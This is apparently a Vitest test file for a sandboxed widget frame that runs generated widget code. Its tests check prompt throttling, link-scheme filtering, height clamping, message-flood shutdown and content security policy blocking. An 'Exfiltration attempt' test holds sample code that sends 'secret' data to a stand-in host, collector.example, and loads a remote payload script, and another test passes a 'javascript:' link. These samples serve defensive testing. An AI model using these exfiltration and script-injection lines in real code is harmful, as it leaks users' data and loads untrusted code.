import type { JSX } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, describe, expect, it } from "vitest";

import { GeneratedWidgetFrame } from "@/components/dashboard/homeGrid/GeneratedWidgetFrame";
import { MAX_WIDGET_HEIGHT } from "@/lib/widgets/sandbox/limits";

const REPORT_MESSAGE_TYPE = "memora-test:hardening-report";

let container: HTMLDivElement | undefined;
let root: Root | undefined;
const reports: Array<Record<string, unknown>> = [];
const collectReport = (event: MessageEvent) => {
  if (event.data?.type === REPORT_MESSAGE_TYPE) {
    reports.push(event.data);
  }
};

const mount = (element: JSX.Element): void => {
  window.addEventListener("message", collectReport);
  container = document.createElement("div");
  document.body.append(container);
  root = createRoot(container);
  root.render(element);
};

afterEach(() => {
  root?.unmount();
  root = undefined;
  container?.remove();
  container = undefined;
  reports.length = 0;
  window.removeEventListener("message", collectReport);
});

describe("Widget frame limits", () => {
  it("forwards only a few prompts from a widget that sends a burst of them", async () => {
    const prompts: string[] = [];
    mount(
      <GeneratedWidgetFrame
        widgetCode={`<script>
for (let i = 0; i < 50; i += 1) sendPrompt("prompt " + i);
window.parent.postMessage({ type: "${REPORT_MESSAGE_TYPE}", done: true }, "*");
</script>`}
        data={null}
        title="Prompt burst"
        onSendPrompt={(text) => prompts.push(text)}
      />,
    );

    await expect.poll(() => reports.length, { timeout: 5000 }).toBe(1);
    await new Promise((resolve) => window.setTimeout(resolve, 200));
    expect(prompts).toEqual(["prompt 0", "prompt 1", "prompt 2"]);
  });

  it("opens only http and https links", async () => {
    const links: string[] = [];
    mount(
      <GeneratedWidgetFrame
        widgetCode={`<script>
openLink("javascript:alert(1)");
openLink("data:text/html,hi");
openLink("https://example.com/ok");
</script>`}
        data={null}
        title="Links"
        onOpenLink={(url) => links.push(url)}
      />,
    );

    await expect.poll(() => links, { timeout: 5000 }).toEqual(["https://example.com/ok"]);
  });

  it("clamps the frame height of a widget that asks for a huge one", async () => {
    mount(
      <GeneratedWidgetFrame
        widgetCode={'<div style="height: 500000px">Tall</div>'}
        data={null}
        title="Tall widget"
      />,
    );

    await expect
      .poll(() => container?.querySelector("iframe")?.style.height, { timeout: 5000 })
      .toBe(`${MAX_WIDGET_HEIGHT}px`);
  });

  it("stops a widget that floods the host with messages", async () => {
    mount(
      <GeneratedWidgetFrame
        widgetCode={`<script>
for (let i = 0; i < 5000; i += 1) window.parent.postMessage({ type: "memora:widget:pong", seq: i }, "*");
</script>`}
        data={null}
        title="Flood"
      />,
    );

    await expect
      .poll(() => container?.querySelector('[role="alert"]')?.textContent, { timeout: 8000 })
      .toContain("This widget was stopped for sending too many requests.");
    expect(container?.querySelector("iframe")).toBeNull();
  });
});

describe("Widget runner content security policy", () => {
  it("blocks network requests and images from hosts outside the CDN allowlist", async () => {
    mount(
      <GeneratedWidgetFrame
        widgetCode={`<script>
const violations = [];
document.addEventListener("securitypolicyviolation", function (event) {
  violations.push(event.violatedDirective.split(" ")[0]);
});
fetch("https://collector.example/steal?data=secret").catch(function () {});
const image = new Image();
image.src = "https://collector.example/pixel.png?data=secret";
const script = document.createElement("script");
script.src = "https://collector.example/payload.js";
document.body.append(script);
window.setTimeout(function () {
  window.parent.postMessage({ type: "${REPORT_MESSAGE_TYPE}", violations: violations }, "*");
}, 300);
</script>`}
        data={null}
        title="Exfiltration attempt"
      />,
    );

    await expect.poll(() => reports.length, { timeout: 5000 }).toBe(1);
    expect(reports[0]?.violations).toEqual(
      expect.arrayContaining(["connect-src", "img-src", "script-src-elem"]),
    );
  });
});

describe("Widget runner built-ins", () => {
  it("gives widgets Chart.js and the lesson quiz without loading anything from the network", async () => {
    mount(
      <GeneratedWidgetFrame
        widgetCode={`<canvas id="chart"></canvas><div id="quiz"></div><script>
const chart = new Chart(document.getElementById("chart"), {
  type: "bar",
  data: { labels: ["a"], datasets: [{ data: [1] }] },
  options: { animation: false },
});
const quiz = lesson.quiz(document.getElementById("quiz"), { title: "Check" });
window.parent.postMessage({
  type: "${REPORT_MESSAGE_TYPE}",
  chartType: chart.config.type,
  hasQuiz: typeof quiz === "object" && quiz !== null,
}, "*");
</script>`}
        data={null}
        title="Built-ins"
      />,
    );

    await expect.poll(() => reports.length, { timeout: 5000 }).toBe(1);
    expect(reports[0]).toMatchObject({ chartType: "bar", hasQuiz: true });
  });
});
